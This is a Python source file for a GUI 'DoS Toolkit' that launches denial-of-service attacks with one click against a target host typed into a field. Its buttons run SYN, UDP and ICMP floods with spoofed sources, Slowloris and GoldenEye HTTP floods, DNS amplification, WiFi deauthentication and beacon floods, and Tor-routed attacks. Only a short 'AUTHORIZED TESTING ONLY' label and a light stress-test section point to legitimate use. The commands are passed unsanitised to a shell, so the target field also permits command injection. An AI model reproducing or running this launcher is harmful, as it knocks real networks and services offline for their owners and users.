import tkinter as tk
from tkinter import messagebox
import subprocess, threading, os, shutil

class DoSToolkit:
    def __init__(self, parent, db, logger):
        self.parent = parent; self.db = db; self.logger = logger
        self.frame = tk.Frame(parent, bg='#1a1a2e')
        self.running = []

    def build(self):
        self.frame.pack(fill='both', expand=True)
        
        header = tk.Frame(self.frame, bg='#1a1a2e')
        header.pack(fill='x', padx=10, pady=5)
        tk.Label(header, text="DoS Toolkit", font=('Courier',16,'bold'), fg='#ff0000', bg='#1a1a2e').pack(side='left')
        tk.Label(header, text="AUTHORIZED TESTING ONLY", font=('Courier',9,'bold'), fg='#ff4444', bg='#1a1a2e').pack(side='right')

        canvas = tk.Canvas(self.frame, bg='#1a1a2e', highlightthickness=0)
        vs = tk.Scrollbar(self.frame, orient='vertical', command=canvas.yview)
        hs = tk.Scrollbar(self.frame, orient='horizontal', command=canvas.xview)
        inner = tk.Frame(canvas, bg='#1a1a2e')
        inner.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0,0), window=inner, anchor='nw')
        canvas.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        canvas.pack(side='left', fill='both', expand=True)
        vs.pack(side='right', fill='y'); hs.pack(side='bottom', fill='x')
        canvas.bind('<Configure>', lambda e: canvas.itemconfig(1, width=e.width))

        tk.Label(inner, text="Target:", font=('Courier',10), fg='#fff', bg='#1a1a2e').pack(anchor='w', padx=10)
        self.target_entry = tk.Entry(inner, font=('Courier',11), bg='#0f3460', fg='#fff', relief='flat')
        self.target_entry.pack(fill='x', padx=10, pady=3)
        self.target_entry.insert(0, "target.com")
        
        tk.Label(inner, text="Port:", font=('Courier',10), fg='#fff', bg='#1a1a2e').pack(anchor='w', padx=10)
        self.port_entry = tk.Entry(inner, font=('Courier',10), bg='#0f3460', fg='#fff', relief='flat', width=10)
        self.port_entry.pack(fill='x', padx=10, pady=3)
        self.port_entry.insert(0, "80")
        
        tk.Button(inner, text="STOP ALL", font=('Courier',10,'bold'), fg='#fff', bg='#cc0000',
                relief='raised', padx=15, pady=6, command=self._stop_all).pack(pady=5)

        # === NETWORK FLOOD ===
        self._section(inner, "Network Flood Attacks", [
            ("SYN Flood", "hping3 -S TARGET -p PORT --flood", "#ff0000"),
            ("UDP Flood", "hping3 --udp TARGET -p PORT --flood", "#ff0000"),
            ("ICMP Flood", "hping3 -1 TARGET --flood", "#ff0000"),
            ("SYN Random Src", "hping3 -S TARGET -p PORT --rand-source --flood", "#ff0000"),
            ("TCP Flood", "nping --tcp-connect -p PORT --rate=100 TARGET", "#ff4444"),
            ("UDP Rate", "nping --udp -p PORT --rate=100 TARGET", "#ff4444"),
            ("All Protocol", "t50 --flood --protocol tcp --port PORT TARGET", "#ff4444"),
        ])
        
        # === HTTP FLOOD ===
        self._section(inner, "HTTP Flood Attacks", [
            ("Slowloris", "slowloris -p PORT TARGET", "#ff8800"),
            ("Slow Headers", "slowhttptest -c 1000 -H -u http://TARGET", "#ff8800"),
            ("Slow Body", "slowhttptest -c 1000 -B -u http://TARGET", "#ff8800"),
            ("GoldenEye", "goldeneye TARGET -w 100 -s 200", "#ff8800"),
            ("Apache Bench", "ab -n 10000 -c 100 http://TARGET/", "#ffaa00"),
            ("Siege", "siege -c 100 -t 30s http://TARGET", "#ffaa00"),
            ("WRK", "wrk -t 10 -c 100 -d 30s http://TARGET", "#ffaa00"),
            ("Hey", "hey -n 10000 -c 100 http://TARGET", "#ffaa00"),
            ("Vegeta", "echo GET http://TARGET | vegeta attack -duration=30s -rate=100", "#ffaa00"),
            ("PyLoris", "pyloris -p PORT TARGET", "#ff8800"),
        ])
        
        # === DNS FLOOD ===
        self._section(inner, "DNS Attacks", [
            ("DNS Flood", "hping3 --udp TARGET -p 53 --flood", "#d2991d"),
            ("DNS Amplify", "dig ANY TARGET @resolver", "#d2991d"),
            ("NXDOMAIN Flood", "for i in seq 1 1000; do dig $i.TARGET; done", "#d2991d"),
        ])
        
        # === WiFi DoS ===
        self._section(inner, "WiFi DoS Attacks", [
            ("Deauth Flood", "aireplay-ng -0 0 -a BSSID IFACE", "#ff00ff"),
            ("Beacon Flood", "mdk4 IFACE b -c 6 -s 2000", "#ff00ff"),
            ("Auth DoS", "mdk4 IFACE a -a BSSID", "#ff00ff"),
            ("EAPOL Flood", "mdk4 IFACE e -t BSSID -s 1000", "#ff00ff"),
            ("WiFi Curse", "wificurse IFACE", "#ff00ff"),
        ])
        
        # === PROXY/TOR ===
        self._section(inner, "Proxy & Anonymous Attacks", [
            ("Tor Hammer", "tor-hammer -t TARGET -p PORT -r 100", "#bc8cff"),
            ("UFONet", "ufonet -a TARGET", "#bc8cff"),
            ("UFONet Proxy", "ufonet -a TARGET --proxy=100", "#bc8cff"),
        ])
        
        # === STRESS TEST ===
        self._section(inner, "Stress Testing (Safe)", [
            ("AB Light", "ab -n 100 -c 5 http://TARGET/", "#00ff88"),
            ("Siege Light", "siege -c 10 -t 10s http://TARGET", "#00ff88"),
            ("WRK Light", "wrk -t 2 -c 10 -d 5s http://TARGET", "#00ff88"),
        ])

        tk.Button(inner, text="STOP ALL ATTACKS", font=('Courier',12,'bold'), fg='#fff', bg='#cc0000',
                relief='raised', padx=20, pady=10, command=self._stop_all).pack(pady=10)
        
        self.output = tk.Text(inner, font=('Courier',9), bg='#0a0a0a', fg='#ff4444', relief='flat', height=10)
        self.output.pack(fill='both', expand=True, padx=10, pady=5)
        tk.Label(inner, text="Ready", font=('Courier',8), fg='#888', bg='#1a1a2e').pack(anchor='w', padx=10)

    def _section(self, parent, title, items):
        sf = tk.LabelFrame(parent, text=f" {title} ", font=('Courier',10,'bold'), fg='#ffaa00', bg='#16213e', padx=8, pady=5)
        sf.pack(fill='x', padx=10, pady=3)
        for name, cmd, color in items:
            card = tk.Frame(sf, bg='#16213e', padx=8, pady=5); card.pack(fill='x', pady=1)
            h = tk.Frame(card, bg='#16213e'); h.pack(fill='x')
            tk.Button(h, text=name, font=('Courier',9,'bold'), fg='#000', bg=color, relief='raised', padx=10, pady=4,
                    command=lambda c=cmd: self._run(c)).pack(side='left')
            tk.Label(h, text=cmd[:55], font=('Courier',8), fg='#888', bg='#16213e').pack(side='left', padx=8)

    def _run(self, cmd):
        target = self.target_entry.get().strip()
        port = self.port_entry.get().strip()
        cmd = cmd.replace("TARGET", target).replace("PORT", port).replace("IFACE", "wlan0").replace("BSSID", "00:11:22:33:44:55")
        
        self.output.insert('end', f"\n{'='*50}\n$ {cmd}\n{'='*50}\n\n")
        self.output.see('end')
        
        def do():
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                self.running.append(p)
                for line in p.stdout:
                    self.output.insert('end', line); self.output.see('end')
                p.wait()
                if p in self.running: self.running.remove(p)
            except Exception as e:
                self.output.insert('end', f"[X] {e}\n")
        threading.Thread(target=do, daemon=True).start()

    def _stop_all(self):
        for p in self.running:
            try: p.kill()
            except: pass
        self.running.clear()
        self.output.insert('end', "\n[ALL STOPPED]\n")
